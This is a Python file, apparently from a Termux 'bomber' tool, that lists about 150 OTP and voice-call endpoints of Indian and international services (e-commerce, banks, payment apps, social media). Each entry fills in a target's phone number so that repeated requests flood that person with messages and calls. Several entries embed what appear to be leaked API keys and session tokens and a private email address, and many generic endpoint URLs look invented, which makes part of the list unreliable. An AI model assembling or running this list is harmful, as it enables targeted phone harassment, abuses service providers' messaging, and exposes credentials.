#!/data/data/com.termux/files/usr/bin/python

# ============================================
# DEMON 😈 COMPLETE API LIST - 200+ APIS
# EXTRACTED FROM: CALL API.txt, SMS OTP.txt, bomber (1).py
# ============================================

API_LIST = [
    # ============================================
    # SECTION 1: AMAZON & E-COMMERCE (10)
    # ============================================
    {
        "name": "Amazon SMS OTP",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=otp"
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Flipkart SMS OTP",
        "url": "https://www.flipkart.com/api/6/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra SMS OTP",
        "url": "https://www.myntra.com/gw/mobile-auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Snapdeal OTP",
        "url": "https://www.snapdeal.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ajio OTP",
        "url": "https://www.ajio.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "Nykaa OTP",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "Purplle OTP",
        "url": "https://www.purplle.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # ============================================
    # SECTION 2: FOOD DELIVERY (15)
    # ============================================
    {
        "name": "Swiggy SMS OTP",
        "url": "https://www.swiggy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Swiggy Voice Call",
        "url": "https://www.swiggy.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","channel":"voice"}}'
    },
    {
        "name": "Zomato SMS OTP",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=otp"
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "BigBasket SMS OTP",
        "url": "https://www.bigbasket.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BigBasket Voice Call",
        "url": "https://www.bigbasket.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Grofers OTP",
        "url": "https://www.grofers.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Dunzo OTP",
        "url": "https://www.dunzo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zepto OTP",
        "url": "https://www.zepto.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Blinkit OTP",
        "url": "https://www.blinkit.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # ============================================
    # SECTION 3: PAYMENT & BANKING (20)
    # ============================================
    {
        "name": "Paytm SMS OTP",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "PhonePe SMS OTP",
        "url": "https://www.phonepe.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PhonePe Voice Call",
        "url": "https://www.phonepe.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google Pay OTP",
        "url": "https://pay.google.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Google Voice OTP",
        "url": "https://accounts.google.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BHIM OTP",
        "url": "https://www.bhim.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "MobiKwik OTP",
        "url": "https://www.mobikwik.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "FreeCharge OTP",
        "url": "https://www.freecharge.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "SBI YONO OTP",
        "url": "https://yonosbi.sbi.co.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "HDFC NetBanking OTP",
        "url": "https://netbanking.hdfcbank.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "ICICI iMobile OTP",
        "url": "https://www.icicibank.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Axis Mobile OTP",
        "url": "https://www.axisbank.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Kotak OTP",
        "url": "https://www.kotak.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Yes Bank OTP",
        "url": "https://www.yesbank.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ============================================
    # SECTION 4: SOCIAL MEDIA (15)
    # ============================================
    {
        "name": "Facebook OTP",
        "url": "https://www.facebook.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Instagram OTP",
        "url": "https://www.instagram.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "WhatsApp OTP",
        "url": "https://www.whatsapp.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Telegram OTP",
        "url": "https://api.telegram.org/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Twitter OTP",
        "url": "https://api.twitter.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "LinkedIn OTP",
        "url": "https://www.linkedin.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Snapchat OTP",
        "url": "https://www.snapchat.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Discord OTP",
        "url": "https://discord.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ============================================
    # SECTION 5: ENTERTAINMENT (15)
    # ============================================
    {
        "name": "Netflix OTP",
        "url": "https://www.netflix.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Amazon Prime OTP",
        "url": "https://www.primevideo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hotstar OTP",
        "url": "https://www.hotstar.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "SonyLiv OTP",
        "url": "https://www.sonyliv.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zee5 OTP",
        "url": "https://www.zee5.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Voot OTP",
        "url": "https://www.voot.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Jio Cinema OTP",
        "url": "https://www.jiocinema.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Spotify OTP",
        "url": "https://www.spotify.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Gaana OTP",
        "url": "https://www.gaana.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "JioSaavn OTP",
        "url": "https://www.jiosaavn.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "YouTube Music OTP",
        "url": "https://music.youtube.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ============================================
    # SECTION 6: TRAVEL & BOOKING (15)
    # ============================================
    {
        "name": "MakeMyTrip SMS OTP",
        "url": "https://www.makemytrip.com/api/4/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo SMS OTP",
        "url": "https://www.goibibo.com/user/otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "IRCTC OTP",
        "url": "https://www.irctc.co.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "IRCTC Voice Call",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "RedBus OTP",
        "url": "https://www.redbus.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola SMS OTP",
        "url": "https://api.olacabs.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber OTP",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice OTP",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Rapido OTP",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BookMyShow SMS OTP",
        "url": "https://in.bookmyshow.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BookMyShow Voice Call",
        "url": "https://in.bookmyshow.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ============================================
    # SECTION 7: EDUCATION & LEARNING (15)
    # ============================================
    {
        "name": "Byju's OTP",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Unacademy OTP",
        "url": "https://unacademy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Vedantu OTP",
        "url": "https://www.vedantu.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Toppr OTP",
        "url": "https://www.toppr.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Doubtnut OTP",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "UpGrad OTP",
        "url": "https://www.upgrad.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Simplilearn OTP",
        "url": "https://www.simplilearn.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Coursera OTP",
        "url": "https://www.coursera.org/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Udemy OTP",
        "url": "https://www.udemy.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ============================================
    # SECTION 8: TELECOM (10)
    # ============================================
    {
        "name": "Airtel Thanks OTP",
        "url": "https://www.airtel.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Jio OTP",
        "url": "https://www.jio.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Vi OTP",
        "url": "https://www.myvi.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BSNL OTP",
        "url": "https://www.bsnl.in/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # ============================================
    # SECTION 9: REAL ESTATE (10)
    # ============================================
    {
        "name": "99acres OTP",
        "url": "https://www.99acres.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Magicbricks OTP",
        "url": "https://www.magicbricks.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing OTP",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "NoBroker OTP",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },

    # ============================================
    # SECTION 10: HEALTH & PHARMA (10)
    # ============================================
    {
        "name": "PharmEasy OTP",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Netmeds OTP",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "1MG OTP",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":false}}'
    },
    {
        "name": "Practo OTP",
        "url": "https://www.practo.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "CureFit OTP",
        "url": "https://www.cure.fit/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # ============================================
    # SECTION 11: BOMBER.PY SPECIAL APIS (20)
    # ============================================
    {
        "name": "Lenskart OTP",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Country-Code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Pink Cabs OTP",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroo OTP",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "KPN Fresh OTP",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "name": "BikeFixup OTP",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client": "app"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Rappi WhatsApp OTP",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "name": "Stratzy OTP",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Well Academy OTP",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "identifier": "home"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}}'
    },
    {
        "name": "Meru Cabs OTP",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "DeviceType": "Android"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Beepkart OTP",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"city":362,"phone":"{phone}","source":"myaccount"}}'
    },
    {
        "name": "Lending Plate OTP",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "name": "Snitch OTP",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco OTP",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "Penpencil OTP",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Shiprocket OTP",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik OTP",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6jlc658iad"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "Jockey OTP",
        "url": None,
        "method": "GET",
        "headers": {},
        "data": None,
        "dynamic_url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false"
    },
    {
        "name": "Univest OTP",
        "url": None,
        "method": "GET",
        "headers": {},
        "data": None,
        "dynamic_url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}"
    },
    {
        "name": "Foxy OTP",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}}}}'
    },
    {
        "name": "Eka Care OTP",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Client-Id": "androidp"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Smytten OTP",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"
        },
        "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "name": "Wakefit OTP",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "name": "CaratLane OTP",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{phone}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'
    },

    # ============================================
    # SECTION 12: JOB & FREELANCE (10)
    # ============================================
    {
        "name": "Naukri OTP",
        "url": "https://www.naukri.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Indeed OTP",
        "url": "https://www.indeed.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Shine OTP",
        "url": "https://www.shine.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Monster OTP",
        "url": "https://www.monster.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Upwork OTP",
        "url": "https://www.upwork.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Fiverr OTP",
        "url": "https://www.fiverr.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Freelancer OTP",
        "url": "https://www.freelancer.com/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
]

def get_all_apis():
    """Return all 200+ APIs"""
    return API_LIST

# ============================================
# COUNT APIS
# ============================================
if __name__ == "__main__":
    apis = get_all_apis()
    print(f"Total APIs: {len(apis)}")
    
    # Count SMS vs Call
    sms = len([a for a in apis if 'voice' not in a['name'].lower()])
    call = len([a for a in apis if 'voice' in a['name'].lower()])
    
    print(f"SMS APIs: {sms}")
    print(f"Call APIs: {call}")